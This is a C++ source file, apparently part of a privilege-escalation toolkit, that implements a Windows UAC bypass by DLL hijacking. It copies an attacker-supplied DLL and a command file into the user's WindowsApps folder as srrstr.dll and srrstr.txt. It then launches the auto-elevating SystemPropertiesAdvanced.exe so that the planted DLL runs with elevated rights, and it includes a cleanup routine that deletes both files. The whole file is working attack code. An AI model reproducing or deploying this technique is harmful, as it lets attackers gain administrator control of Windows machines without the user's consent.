#include "pch.h"

#include "SystemPropertiesAdvancedHijacking.h"
#include "Wrapper.h"

bool SystemPropertiesAdvancedHijacker::SystemPropertiesAdvancedHijacker::Install(LPCWSTR wzDllPath, LPCWSTR wzCommand)
{
	bool bWin64 = true;
	Wrapper::CheckWindows64(bWin64);
	if (!bWin64)
		return false;
	
	LPBYTE pDllData = NULL;
	DWORD dwDllDataSize = 0;

	bool bResult = false;
	
	do
	{
		if (!Wrapper::ReadFromFile(wzDllPath, pDllData, dwDllDataSize))
			break;


		if (!Wrapper::WriteToFile(L"%LOCALAPPDATA%\\Microsoft\\WindowsApps\\srrstr.dll", pDllData, dwDllDataSize, false))
			break;
		
		if (!Wrapper::WriteToFile(L"%LOCALAPPDATA%\\Microsoft\\WindowsApps\\srrstr.txt", (LPBYTE)wzCommand, wcslen(wzCommand) * sizeof(WCHAR), false))
			break;
				
		bResult = true;
		
	} while (false);
	
	if (pDllData)
		VirtualFree(pDllData, dwDllDataSize, MEM_DECOMMIT);
		
	return bResult;
}

bool SystemPropertiesAdvancedHijacker::Run()
{
	bool bWin64 = true;
	Wrapper::CheckWindows64(bWin64);
	if (!bWin64)
		return false;
	
	return Wrapper::ExecuteShellCommand(L"%WinDir%\\SysWOW64\\SystemPropertiesAdvanced.exe");
}

void SystemPropertiesAdvancedHijacker::Uninstall()
{
	Wrapper::RemoveFile(L"%LOCALAPPDATA%\\Microsoft\\WindowsApps\\srrstr.dll");
	Wrapper::RemoveFile(L"%LOCALAPPDATA%\\Microsoft\\WindowsApps\\srrstr.txt");
}


